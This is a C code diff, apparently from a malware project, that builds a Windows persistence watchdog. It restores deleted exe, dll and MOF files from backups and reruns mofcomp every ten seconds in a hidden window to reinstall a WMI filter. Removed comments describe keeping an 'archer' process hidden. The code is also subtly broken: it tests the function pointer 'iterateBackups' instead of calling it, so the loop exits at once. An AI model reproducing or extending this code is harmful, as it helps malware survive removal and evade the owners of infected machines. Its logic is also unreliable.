@@ -1,6 +1,17 @@
 #include <windows.h>
 
-void exec(char* program, char* command)
+const char* backupArray[] = {
+    "backuppath",
+    "newpath",
+    "backuppath",
+    "newpath",
+    "backuppath",
+    "newpath",
+    "backuppath",
+    "newpath",
+};
+
+void exec(const char* command)
 {
 	STARTUPINFOA si;
 	PROCESS_INFORMATION pi;
@@ -9,7 +20,7 @@ void exec(char* program, char* command)
 	si.cb = sizeof(si);
 	ZeroMemory(&pi, sizeof(pi));
 	
-	CreateProcessA(program, command, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
+	CreateProcessA(NULL, (char*)command, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
 
     // test both TODO
     WaitForInputIdle(pi.hProcess, INFINITE);
@@ -20,14 +31,30 @@ void exec(char* program, char* command)
 	CloseHandle(pi.hThread);
 }
 
+int iterateBackups()
+{
+    for (int i = 0; i < sizeof(backupArray) / sizeof(backupArray[0]); i+=2)
+    if (!CopyFileA(backupArray[i], backupArray[i+1], TRUE)) // return 0 means it failed
+    {
+        if (GetLastError() == ERROR_FILE_NOT_FOUND)
+        {
+            return 1;
+        }
+    }
+    return 0;
+}
+
 int main()
 {
-    // main program infinite loop. call for each of the 3 files.
+    for(;;)
+    {
+        // files watchdog
+        if (iterateBackups) { return 1; }
 
-    // check if exe + dll files exist - file check function, path parameter
-    // check if mof file exists - file check function, path parameter
-    // move backups to location if either one are moved / deleted, copy backup function, path1 path2 parameter
-    // run mofcomp to install wmi filter every X seconds - once 3 file loop is done, sleep x seconds and run mofcomp.
-    
-    // guard: make sure archer process is hidden
+        // install WMI Filter in thread
+        CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)&exec, "mofcomp.exe path_to_wizard.mof", 0, NULL); 
+
+        // sleep 10 seconds
+        Sleep(10000);
+    }
 }
